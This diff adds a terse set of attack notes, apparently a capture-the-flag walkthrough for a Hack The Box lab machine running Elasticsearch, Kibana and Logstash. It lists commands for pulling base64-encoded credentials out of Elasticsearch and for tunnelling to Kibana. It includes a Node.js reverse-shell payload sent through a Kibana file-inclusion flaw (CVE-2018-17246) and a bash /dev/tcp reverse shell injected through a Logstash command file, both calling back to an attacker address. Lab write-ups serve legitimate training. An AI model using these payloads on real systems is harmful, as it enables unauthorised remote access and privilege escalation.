@@ -1,0 +1,40 @@
+//Based on MinatoTW & IppSec
+9200 -> Elasticsearch
+curl -s 'http://10.10.10.115:9200/quotes/_search?size=253' | jq '.hits.hits | .[] | ._source.quote'
+"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=" 
+"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
+security:spanish.is.key
+
+ss -4 -l -n						//view network connections
+ssh -L 5602:127.0.0.1:5601 security@10.10.10.115
+
+https://github.com/mpgn/CVE-2018-17246
+vim /tmp/shell.js
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "10.10.14.16", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+curl 'http://127.0.0.1:5602/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../tmp/shell.js'
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo
+fg
+
+find / -group kibana 2>/dev/null | grep -v proc
+ls /etc/logstash/conf.d/
+echo 'Ejecutar comando : whoami > /tmp/user' > /opt/kibana/logstash_execute
+cat /tmp/user
+
+nc -lvnp 1235
+echo 'Ejecutar comando : bash -i & /dev/tcp/10.10.14.16/1235 0>&1' > /opt/kibana/logstash_exec
